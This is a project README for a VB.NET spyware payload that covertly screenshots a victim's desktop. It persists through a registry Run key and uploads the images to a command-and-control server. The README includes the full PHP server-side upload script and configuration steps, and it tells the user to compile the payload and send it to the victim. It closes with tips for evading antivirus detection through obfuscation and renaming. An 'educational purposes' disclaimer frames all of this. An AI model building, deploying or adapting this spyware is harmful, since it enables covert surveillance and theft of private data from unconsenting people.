[![forthebadge](https://forthebadge.com/images/badges/built-with-swag.svg)](https://forthebadge.com)

<p align="center">
  <img src="https://i.ibb.co/B4WbGyq/Screenshot-11.png">  
</p>
<p align="center">
<b> Silent Screenshot Capture | Post Exploitation Payload | VB.NET </b>
</p>
<p align="center">
 A simple payload to take the screenshot of victims desktop and upload it to the C&C.
</p>


## DISCLAIMER

<p align="center">
  TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>

The use of the Mr.Peter & its resources is **COMPLETE RESPONSIBILITY of the END-USER**. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Also we inform you that some of your your actions may be **ILLEGAL** and you **CAN NOT** use this software to test person or company without **WRITTEN PERMISSION** from them.


## Features:

 - Persistent (Using Registry Run Key)
 - Works in background 
 - Less Code Less Bugs and Less Detection ;)
 - Deletes the screenshot from disk after upload it to C&C
 - C&C server in base64 
 - Upload screenshots in organized way on C&C
 - No port forwarding needed! works with a single php file
 - [TODO] Machine Information 
 - [TODO] Encryption 
 - [TODO] Set interval remotely from C&C

## Installation & Usage:
-   Clone this repository.
- A webhosting i recommend [namecheap](https://www.namecheap.com/) 
- Goto your public_html folder and make new [PHP](https://en.wikipedia.org/wiki/PHP) file and put below code in it
```
<?php
$del = $_GET["dellog"];
$folder = $_GET["folder"];
mkdir($folder,0777);
$file = $_GET["path"];
if (!empty($_FILES["file"])){
move_uploaded_file($_FILES["file"]["tmp_name"],
      $file . "/" . $_FILES["file"]["name"]);
}
unlink($del);
?>
```
 - Open the project in Visual Studio and the edit below variable in source code 
```
Dim server As String = BaseDecode1("your server address here in base64 encoded") 
```
 - and edit this variable below as well
```
Dim php As String = "yourphpfilename.php?" & "folder="
```
 - Just compile it and send it to the victim thats all !!
 
 ## Million Dollar Advice ;):
 To Avoid Antivirus Detection
 
 - Change the app icon
 - Generate new GUID 
 - Changes all the variables
 - Obfuscate the code using Using [Obfuscar](https://github.com/obfuscar/obfuscar)
 - Change the Assembly information 

## License:
 [**GNU GENERAL PUBLIC LICENSE**](https://github.com/mrfr05t/Mr.Peter/blob/master/LICENSE) 
 
 
